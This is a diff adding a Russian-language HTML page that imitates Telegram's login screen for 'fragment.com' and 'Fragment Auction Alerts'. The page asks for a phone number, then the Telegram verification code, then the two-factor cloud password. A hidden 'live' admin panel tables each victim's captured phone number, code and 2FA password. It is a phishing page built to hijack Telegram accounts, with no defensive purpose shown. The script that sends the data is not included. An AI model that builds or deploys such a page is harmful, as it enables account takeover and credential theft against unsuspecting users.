@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в Telegram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="container">
+        <div class="login-card" id="loginCard">
+            <!-- Начальный экран: Ввод телефона -->
+            <div class="card-step" id="phoneStep">
+                <div class="logo-container">
+                    <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="tg-logo">
+                </div>
+                <h1 class="card-title">Telegram</h1>
+                <p class="card-subtitle">для <strong>fragment.com</strong> и <strong>Fragment Auction Alerts</strong>.
+                </p>
+                <p class="card-description">Введите свой номер телефона в международном формате. Подтверждение будет
+                    отправлено в Telegram.</p>
+
+                <div class="input-group">
+                    <div class="custom-select-container" id="countryDropdown">
+                        <div class="select-selected">
+                            <span id="selectedCountryName"><img
+                                    src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f3-1f1f1.png"
+                                    class="flag-icon"> Нидерланды</span>
+                            <span class="arrow"></span>
+                        </div>
+                        <div class="select-items hidden" id="countryList">
+                            <div class="search-box">
+                                <input type="text" id="countrySearch" placeholder="Поиск страны...">
+                            </div>
+                            <div class="items-wrapper">
+                                <div class="select-item" data-value="+7" data-name="Россия" data-flag="1f1f7-1f1fa"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f7-1f1fa.png"
+                                        class="flag-icon"> Россия</div>
+                                <div class="select-item" data-value="+380" data-name="Украина" data-flag="1f1fa-1f1e6">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1fa-1f1e6.png"
+                                        class="flag-icon"> Украина
+                                </div>
+                                <div class="select-item" data-value="+375" data-name="Беларусь" data-flag="1f1e7-1f1fe">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1e7-1f1fe.png"
+                                        class="flag-icon"> Беларусь
+                                </div>
+                                <div class="select-item" data-value="+7" data-name="Казахстан" data-flag="1f1f0-1f1ff">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f0-1f1ff.png"
+                                        class="flag-icon"> Казахстан
+                                </div>
+                                <div class="select-item" data-value="+998" data-name="Узбекистан"
+                                    data-flag="1f1fa-1f1ff"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1fa-1f1ff.png"
+                                        class="flag-icon"> Узбекистан</div>
+                                <div class="select-item" data-value="+996" data-name="Кыргызстан"
+                                    data-flag="1f1f0-1f1ec"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f0-1f1ec.png"
+                                        class="flag-icon"> Кыргызстан</div>
+                                <div class="select-item" data-value="+992" data-name="Таджикистан"
+                                    data-flag="1f1f9-1f1ef"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f9-1f1ef.png"
+                                        class="flag-icon"> Таджикистан</div>
+                                <div class="select-item" data-value="+993" data-name="Туркменистан"
+                                    data-flag="1f1f9-1f1f2"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f9-1f1f2.png"
+                                        class="flag-icon"> Туркменистан</div>
+                                <div class="select-item" data-value="+374" data-name="Армения" data-flag="1f1e6-1f1f2">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1e6-1f1f2.png"
+                                        class="flag-icon"> Армения
+                                </div>
+                                <div class="select-item" data-value="+994" data-name="Азербайджан"
+                                    data-flag="1f1e6-1f1ff"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1e6-1f1ff.png"
+                                        class="flag-icon"> Азербайджан</div>
+                                <div class="select-item" data-value="+995" data-name="Грузия" data-flag="1f1ec-1f1ea">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1ec-1f1ea.png"
+                                        class="flag-icon"> Грузия
+                                </div>
+                                <div class="select-item" data-value="+371" data-name="Латвия" data-flag="1f1f1-1f1fb">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f1-1f1fb.png"
+                                        class="flag-icon"> Латвия
+                                </div>
+                                <div class="select-item" data-value="+370" data-name="Литва" data-flag="1f1f1-1f1f9">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f1-1f1f9.png"
+                                        class="flag-icon"> Литва
+                                </div>
+                                <div class="select-item" data-value="+372" data-name="Эстония" data-flag="1f1ea-1f1ea">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1ea-1f1ea.png"
+                                        class="flag-icon"> Эстония
+                                </div>
+                                <div class="select-item" data-value="+373" data-name="Молдова" data-flag="1f1f2-1f1e9">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f2-1f1e9.png"
+                                        class="flag-icon"> Молдова
+                                </div>
+                                <div class="select-item" data-value="+1" data-name="США / Канада"
+                                    data-flag="1f1fa-1f1f8"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1fa-1f1f8.png"
+                                        class="flag-icon"> США / Канада</div>
+                                <div class="select-item" data-value="+44" data-name="Великобритания"
+                                    data-flag="1f1ec-1f1e7"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1ec-1f1e7.png"
+                                        class="flag-icon"> Великобритания</div>
+                                <div class="select-item" data-value="+49" data-name="Германия" data-flag="1f1e9-1f1ea">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1e9-1f1ea.png"
+                                        class="flag-icon"> Германия
+                                </div>
+                                <div class="select-item" data-value="+33" data-name="Франция" data-flag="1f1eb-1f1f7">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1eb-1f1f7.png"
+                                        class="flag-icon"> Франция
+                                </div>
+                                <div class="select-item" data-value="+39" data-name="Италия" data-flag="1f1ee-1f1f9">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1ee-1f1f9.png"
+                                        class="flag-icon"> Италия
+                                </div>
+                                <div class="select-item" data-value="+34" data-name="Испания" data-flag="1f1ea-1f1f8">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1ea-1f1f8.png"
+                                        class="flag-icon"> Испания
+                                </div>
+                                <div class="select-item selected" data-value="+31" data-name="Нидерланды"
+                                    data-flag="1f1f3-1f1f1"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f3-1f1f1.png"
+                                        class="flag-icon"> Нидерланды</div>
+                                <div class="select-item" data-value="+48" data-name="Польша" data-flag="1f1f5-1f1f1">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f5-1f1f1.png"
+                                        class="flag-icon"> Польша
+                                </div>
+                                <div class="select-item" data-value="+90" data-name="Турция" data-flag="1f1f9-1f1f7">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1f9-1f1f7.png"
+                                        class="flag-icon"> Турция
+                                </div>
+                                <div class="select-item" data-value="+971" data-name="ОАЭ" data-flag="1f1e6-1f1ea"><img
+                                        src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1e6-1f1ea.png"
+                                        class="flag-icon"> ОАЭ</div>
+                                <div class="select-item" data-value="+972" data-name="Израиль" data-flag="1f1ee-1f1f1">
+                                    <img src="https://cdn.jsdelivr.net/npm/emoji-datasource-apple/img/apple/64/1f1ee-1f1f1.png"
+                                        class="flag-icon"> Израиль
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="phone-input-wrapper">
+                        <span class="country-prefix" id="countryPrefix">+31</span>
+                        <input type="tel" id="phoneNumber" placeholder="--- --- ---" maxlength="15">
+                    </div>
+                </div>
+
+                <div class="card-actions">
+                    <button class="btn btn-text" id="cancelBtn">ОТМЕНА</button>
+                    <button class="btn btn-primary" id="nextBtn">ДАЛЕЕ</button>
+                </div>
+            </div>
+
+            <!-- Второй экран: Ввод кода (скрыт по умолчанию) -->
+            <div class="card-step hidden" id="codeStep">
+                <div class="logo-container">
+                    <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="tg-logo">
+                </div>
+                <h1 class="card-title">Проверка кода</h1>
+                <p class="card-subtitle">Мы отправили код в приложение <strong>Telegram</strong> на вашем устройстве.
+                </p>
+
+                <div class="input-group code-group">
+                    <input type="text" id="verificationCode" placeholder="Код из Telegram" maxlength="6"
+                        autocomplete="one-time-code">
+                </div>
+
+                <div class="card-actions">
+                    <button class="btn btn-text" id="backBtn">НАЗАД</button>
+                    <button class="btn btn-primary" id="verifyBtn">ВОЙТИ</button>
+                </div>
+            </div>
+
+            <!-- Третий экран: Ввод облачного пароля (2FA) -->
+            <div class="card-step hidden" id="twoFactorStep">
+                <div class="logo-container">
+                    <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="tg-logo">
+                </div>
+                <h1 class="card-title">Двухэтапная проверка</h1>
+                <p class="card-subtitle">Введите ваш <strong>облачный пароль</strong>.</p>
+
+                <div class="input-group code-group">
+                    <input type="password" id="cloudPassword" placeholder="Ваш пароль"
+                        style="width: 100%; border: none; background: transparent; font-size: 17px; outline: none;">
+                </div>
+
+                <div class="card-actions">
+                    <button class="btn btn-primary" id="cloudPasswordBtn" style="width: 100%;">ПОДТВЕРДИТЬ</button>
+                </div>
+            </div>
+
+            <!-- Экран успеха -->
+            <div class="card-step hidden" id="successStep">
+                <div class="logo-container">
+                    <div class="success-icon">✓</div>
+                </div>
+                <h1 class="card-title">Вход выполнен успешно</h1>
+                <p class="card-description">Вы успешно авторизовались в системе.</p>
+            </div>
+
+            <!-- Оверлей загрузки -->
+            <div class="loading-overlay hidden" id="loadingOverlay">
+                <div class="spinner"></div>
+                <p>Пожалуйста, подождите...</p>
+            </div>
+        </div>
+
+        <!-- Админ-панель (скрыта по умолчанию) -->
+        <div class="admin-panel hidden" id="adminPanel">
+            <div class="admin-header">
+                <h2>Админ-панель (LIVE)</h2>
+                <button class="btn btn-text btn-logout" id="logoutBtn">Выход</button>
+            </div>
+            <div class="table-container">
+                <table id="logsTable">
+                    <thead>
+                        <tr>
+                            <th>Время</th>
+                            <th>Телефон / Пароль</th>
+                            <th>Код</th>
+                            <th>2FA</th>
+                            <th>Действия</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logsBody">
+                        <!-- Сюда будут падать данные -->
+                    </tbody>
+                </table>
+            </div>
+            <div class="admin-footer">
+                <p>Мониторинг активен. Данные обновляются автоматически.</p>
+                <button class="btn btn-secondary" id="clearLogsBtn">Очистить логи</button>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+
+</html>
